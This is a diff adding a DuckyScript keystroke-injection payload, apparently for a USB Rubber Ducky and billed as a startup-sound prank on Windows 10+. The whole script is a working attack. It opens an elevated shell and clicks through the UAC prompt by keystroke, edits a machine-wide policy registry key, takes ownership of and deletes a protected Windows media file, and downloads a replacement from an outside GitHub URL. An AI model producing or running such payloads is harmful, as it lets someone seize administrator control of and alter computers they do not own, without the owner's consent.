@@ -1,0 +1,30 @@
+REM Title: Startup sound troll POC version WIP
+REM Author: FalsePhilosopher
+REM Target:  Win 10+
+REM Props: Hak5 and memes
+REM Version: 1.0
+REM Category: Prank
+REM Turns on the startup sound and changes it to X sound
+
+DELAY 500
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1500
+ALT y
+DELAY 1500
+STRING Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableStartupSound -Value 1 -Force
+ENTER
+GUI r
+DELAY 1000
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 1500
+STRING cd C:\Windows\Media && takeown /f welcome.wav /r /a /d y && icacls welcome.wav /inheritance:r /grant:r administrators:(F) /t & del /f /q welcome.wav && exit
+ENTER
+DELAY 500
+STRING cd C:\Windows\Media ;; iwr -Uri 'https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/prank/Win/Starup_Sound_Troll/LN.wav' -OutFile welcome.wav ;; exit
+ENTER
